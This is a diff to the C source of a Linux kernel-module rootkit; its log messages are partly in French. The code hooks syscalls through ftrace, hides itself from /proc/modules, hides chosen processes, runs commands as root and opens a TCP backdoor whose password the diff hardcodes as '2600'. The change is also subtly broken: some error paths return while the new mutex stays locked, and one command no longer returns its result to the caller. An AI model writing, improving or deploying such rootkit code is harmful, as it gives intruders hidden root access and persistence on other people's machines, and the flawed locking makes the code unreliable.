@@ -37,6 +37,7 @@ struct ftrace_hook
     struct ftrace_ops ops;
 };
 
+static DEFINE_MUTEX(rk_mutex);
 typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
 
 static orig_getdents64_t orig_getdents64;
@@ -50,7 +51,7 @@ static struct socket *backdoor_sock = NULL;
 static pid_t pid_to_hide = 0;
 static int backdoor_port = 0;
 char rk_msg[RK_MSG_MAX];
-static char backdoor_password[BACKDOOR_PASS_MAX] = "";
+static char backdoor_password[BACKDOOR_PASS_MAX] = "2600";
 static struct task_struct *backdoor_thread = NULL;
 
 
@@ -200,8 +201,9 @@ static asmlinkage long new_read(const struct pt_regs *regs)
 
     ret = orig_read(regs);
 
-    if (ret <= 0)
+    if (ret <= 0 || ret > MAX_READ_INTERCEPT) {
         return ret;
+    }
 
     if (strcmp(path_fd, "/proc/modules") == 0) {
         char *kbuf;
@@ -609,6 +611,24 @@ static int backdoor_thread_fn(void *data)
 }
 
 /**
+ * The function `close_backdoor_port` closes a backdoor port if it is open.
+ */
+static void close_backdoor_port(void)
+{
+    if (backdoor_thread) {
+        kthread_stop(backdoor_thread);
+        backdoor_thread = NULL;
+    }
+
+    if (backdoor_sock) {
+        sock_release(backdoor_sock);
+        backdoor_sock = NULL;
+        backdoor_port = 0;
+        pr_info("[+] Backdoor fermée\n");
+    }
+}
+
+/**
  * The function `open_backdoor_port` creates a TCP socket, binds it to a specified port, and listens
  * for incoming connections.
  * 
@@ -624,9 +644,7 @@ static int open_backdoor_port(int port)
     struct sockaddr_in addr;
     int ret;
 
-    if (backdoor_sock)
-        sock_release(backdoor_sock);
-
+    close_backdoor_port();
     ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &backdoor_sock);
     if (ret < 0)
         return ret;
@@ -661,26 +679,8 @@ static int open_backdoor_port(int port)
 
 
 /**
- * The function `close_backdoor_port` closes a backdoor port if it is open.
- */
-static void close_backdoor_port(void)
-{
-    if (backdoor_thread) {
-        kthread_stop(backdoor_thread);
-        backdoor_thread = NULL;
-    }
-
-    if (backdoor_sock) {
-        sock_release(backdoor_sock);
-        backdoor_sock = NULL;
-        backdoor_port = 0;
-        pr_info("[+] Backdoor fermée\n");
-    }
-}
-
-/**
- * The function `handle_escalation` in the given code snippet handles privilege escalation either by
- * PID or by executing a command as root.
+ * The function `handle_escalation` in the given code snippet handles privilege escalation
+ * by executing a command as root.
  * 
  * @param args The `handle_escalation` function takes a pointer to a `struct rk_args` named `args` as a
  * parameter. This structure likely contains information needed for privilege escalation, such as the
@@ -692,26 +692,7 @@ static void close_backdoor_port(void)
  */
 static int handle_escalation(struct rk_args *args)
 {
-    if (args->value == RK_PRIVESC_BY_PID) {
-        struct cred * new_cred = prepare_kernel_cred(NULL);
-        if (!new_cred) {
-            printk(KERN_ERR "rootkit: prepare_kernel_cred failed\n");
-            return -ENOMEM;
-        }
-
-        struct pid *pid_struct = find_get_pid(args->target);
-        struct task_struct *task = get_pid_task(pid_struct, PIDTYPE_PID);
-        put_pid(pid_struct);
-        
-        if (!task) {
-            put_cred(new_cred);
-            printk(KERN_ERR "rootkit: PID %lu not found\n", args->target);
-            return -ESRCH;
-        }
-        commit_creds(new_cred);
-        printk(KERN_INFO "rootkit: escalade de privilèges réussie pour PID=%lu\n", args->target);
-    
-    } else if (args->value ==  RK_PRIVESC_BY_CMD) {
+    if (args->value ==  RK_PRIVESC_BY_CMD) {
         char cmd[256];
         char __user *cmd_user = (char __user *)args->target;
 
@@ -763,21 +744,22 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
     struct rk_args args;
 
-    if (_IOC_TYPE(cmd) != RK_MAGIC)
+    if (_IOC_TYPE(cmd) != RK_MAGIC) {
         return -ENOTTY;
+    }
 
+    if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args))) {
+        return -EFAULT;
+    }
+    mutex_lock(&rk_mutex);
+    
     switch (cmd) {
-
     case RK_CMD_PRIVESC:
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
         printk(KERN_INFO "rootkit: PRIVESC pour PID=%lu\n", args.target);
-        return handle_escalation(&args);
+        handle_escalation(&args);
         break;
 
     case RK_CMD_HIDE_PID:
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
         printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
         pid_to_hide = (pid_t)args.target;
         break;
@@ -785,48 +767,38 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
     case RK_CMD_GETUID:
         args.target = (unsigned int)current_uid().val;
         args.value = 0;
-        if (copy_to_user((struct rk_args __user *)arg, &args, sizeof(args)))
-            return -EFAULT;
         printk(KERN_INFO "rootkit: GETUID uid=%lu\n", args.target);
         break;
 
     case RK_CMD_SET_MSG:
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
-
         if (strncpy_from_user(rk_msg,
                               (const char __user *)(unsigned long)args.target,
                               RK_MSG_MAX - 1) < 0)
             return -EFAULT;
 
         rk_msg[RK_MSG_MAX - 1] = '\0';
-    break;
+        break;
         
     case RK_CMD_OPEN_BACKDOOR:
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
-
         if (open_backdoor_port((int)args.target) < 0)
             return -EFAULT;
-    break;
+        break;
 
     case RK_CMD_SET_BACKDOOR_PASS:
-        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
-            return -EFAULT;
-
         if (strncpy_from_user(backdoor_password,
                             (const char __user *)(unsigned long)args.target,
                             BACKDOOR_PASS_MAX - 1) < 0)
             return -EFAULT;
 
         backdoor_password[BACKDOOR_PASS_MAX - 1] = '\0';
-    break;
+        break;
 
 
     default:
+        mutex_unlock(&rk_mutex);
         return -ENOTTY;
     }
-
+    mutex_unlock(&rk_mutex);
     return 0;
 }
 
